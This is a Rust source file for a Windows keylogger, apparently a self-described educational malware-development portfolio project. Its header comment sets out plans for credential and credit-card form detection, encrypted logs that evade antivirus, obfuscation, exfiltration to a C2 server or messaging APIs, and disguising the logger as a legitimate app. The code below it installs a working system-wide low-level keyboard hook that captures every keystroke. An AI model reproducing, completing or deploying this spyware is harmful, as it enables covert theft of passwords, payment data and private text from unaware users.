use std::ptr;

/*
This is a keylogger for educational purposes only.
The main goal is proving some maldev portfolio + rust skills.
// Educational Purpose:
// This project is a keylogger for Windows developed in Rust for purely
// educational and research purposes in the field of 'malware development'. The goal is
// to understand the techniques used by this type of software to develop
// better defenses. The code will be part of a public portfolio on GitHub and will
// be used as material for a talk at the Ekoparty security conference.
// It must NOT be used for malicious purposes.
// -------------------------------------------------------------------

// # PHASE 1: Core Keylogger Requirements

// ## 1. Keystroke Hooking Module
//    - Objective: Silently capture all system-wide keystrokes.
//    - Implementation: Utilize a low-level keyboard hook via the WinAPI,
//      specifically with the `SetWindowsHookExA` and `GetMessage` functions.
//    - Log Format: Save the pressed key along with a timestamp. Handle
//      special keys like [SHIFT], [CTRL], [ENTER], [BACKSPACE], etc.

// ## 2. Context Awareness Module
//    - Objective: Understand where the user is typing to classify the information.
//    - 2.1. Active Application Identification:
//        - Implementation: Each time a key is captured, get the foreground window
//          (`GetForegroundWindow`) and its title (`GetWindowTextW`).
//        - Log: Record the process name (e.g., "chrome.exe") and the window title
//          (e.g., "Gmail - Inbox - Google Chrome").
//    - 2.2. Credential Form Detection:
//        - Heuristics: Analyze the window title and/or UI elements (if possible)
//          for keywords like "login", "sign in", "password", "register".
//    - 2.3. PII and Financial Data Form Detection:
//        - Heuristics: Similar to the previous point, look for keywords like "credit card",
//          "CVV", "billing address", "SSN".

// ## 3. Secure & Stealthy Storage Module
//    - Objective: Save the logs to the local disk in a way that is not easily
//      detectable or readable by an antivirus or a user.
//    - 3.1. Process Persistence:
//        - The program must run continuously and silently in the background.
//          Initially, it will be a console application, but the plan is to make it windowless.
//    - 3.2. Log Encryption:
//        - Implementation: Before writing data to the log file, encrypt it in memory.
//          Use a symmetric encryption algorithm (e.g., AES-GCM or ChaCha20-Poly1305)
//          with a key embedded in the binary.
//        - File Format: The resulting file will be binary, not plaintext,
//          preventing simple AV signatures from detecting it. A simple `cat` or `type`
//          command on the file will not reveal its contents.
//    - 3.3. Modern Evasion (Considerations):
//        - String Obfuscation: Avoid having cleartext strings in the binary (like "keylogger",
//          "hook", etc.).
//        - Dynamic API Loading: Load WinAPI functions at runtime
//          (`LoadLibrary`, `GetProcAddress`) to hinder static analysis.

// # PHASE 2: Future Enhancements

// ## 4. Data Exfiltration Module
//    - Objective: Periodically send the encrypted logs to a remote destination.
//    - Implementation (Future):
//        - Create an internal scheduler that activates every X hours.
//        - Send the log file through a discreet channel (e.g., an HTTP POST request
//          to a C2 server, using DNS-over-HTTPS, or via Telegram/Discord API).
//        - After sending, delete the local log to leave no trace.

// ## 5. Masquerading Module
//    - Objective: Make the keylogger appear to be a legitimate application.
//    - Implementation (Future):
//        - Package the keylogger inside an application with a real and useful
//          functionality (e.g., a calculator, a small game, a system optimizer).
//        - The keylogger will run in a separate thread while the main application
//          functions normally.

// # Dependencies (Crates to consider)
// - `windows-sys`: For direct calls to the Windows API.
// - `chrono`: For timestamp management.
// - `aes-gcm` or `chacha20poly1305`: For log encryption.
// - `reqwest`: (Future) For data exfiltration over HTTP.

*/


mod log;
mod encryption;
mod classifier;
mod scheduler;


fn main() {
    

    // Initialize logger
    println!("Starting keylogger...");
    println!("Press Ctrl+C to stop...");


    // Agregar manejo de señales para cleanup limpio
    ctrlc::set_handler(move || { // esta linea es para capturar ctrl+c
        println!("\nReceived Ctrl+C, cleaning up...");
        unsafe {
            if HOOK != 0 { // si el hook está activo
                UnhookWindowsHookEx(HOOK);
                println!("Hook removed successfully");
            }
        }
        std::process::exit(0);
    }).expect("Error setting Ctrl+C handler");
    

    // Iniciar captura de teclas
    if let Err(e) = capture_keystroke() {
        eprintln!("Error starting keylogger: {}", e);
        // Cleanup en caso de error
        unsafe {
            if HOOK != 0 {
                UnhookWindowsHookEx(HOOK);
            }
        }
        return;
    }


}

use windows_sys::Win32::{
    Foundation::{HINSTANCE, LPARAM, LRESULT, WPARAM},
    UI::WindowsAndMessaging::{
        CallNextHookEx, GetMessageW, SetWindowsHookExW, UnhookWindowsHookEx,
        HC_ACTION, KBDLLHOOKSTRUCT, MSG, WH_KEYBOARD_LL, WM_KEYDOWN, WM_SYSKEYDOWN,
    },
};

static mut HOOK: isize = 0;

unsafe extern "system" fn low_level_keyboard_proc(
    n_code: i32,
    w_param: WPARAM,
    l_param: LPARAM,
) -> LRESULT {
    if n_code == HC_ACTION as i32 {
        if w_param == WM_KEYDOWN as usize || w_param == WM_SYSKEYDOWN as usize {
            let kb_struct = unsafe { *(l_param as *const KBDLLHOOKSTRUCT) };
            let vk_code = kb_struct.vkCode;
            
            // Convertir virtual key code a caracter
            let key_char = match vk_code {
                0x08 => "[BACKSPACE]".to_string(),
                0x09 => "[TAB]".to_string(),
                0x0D => "[ENTER]".to_string(),
                0x10 => "[SHIFT]".to_string(),
                0x11 => "[CTRL]".to_string(),
                0x12 => "[ALT]".to_string(),
                0x1B => "[ESC]".to_string(),
                0x20 => " ".to_string(),
                0x30..=0x39 => char::from(vk_code as u8).to_string(), // 0-9
                0x41..=0x5A => char::from(vk_code as u8).to_string(), // A-Z
                // Hay algunas teclas especiales que habríá que mapear acá como WIN, F1-F12, etc.
                _ => format!("[{}]", vk_code),
            };
            
            // Print con fines de debugging
            println!("Key pressed: {}", key_char);
            // TODO: Aquí llamar a función de logging/encryption
        }
    }
    
    unsafe { CallNextHookEx(HOOK, n_code, w_param, l_param) }
}

fn capture_keystroke() -> Result<(), Box<dyn std::error::Error>> {
    unsafe {
        // Instalar hook de bajo nivel para capturar teclas del sistema
        HOOK = SetWindowsHookExW(
            WH_KEYBOARD_LL,
            Some(low_level_keyboard_proc),
            0 as HINSTANCE,
            0,
        );
        
        if HOOK == 0 {
            return Err("Failed to install keyboard hook".into());
        }
        
        println!("Keyboard hook installed successfully");
        
        // Loop de mensajes para mantener el hook activo
        let mut msg: MSG = std::mem::zeroed(); // Inicializar MSG
        while GetMessageW(&mut msg, 0, 0, 0) > 0 {
            // El hook procesa automáticamente las teclas
        }
        
        // Cleanup
        UnhookWindowsHookEx(HOOK);
    }
    
    Ok(())
}
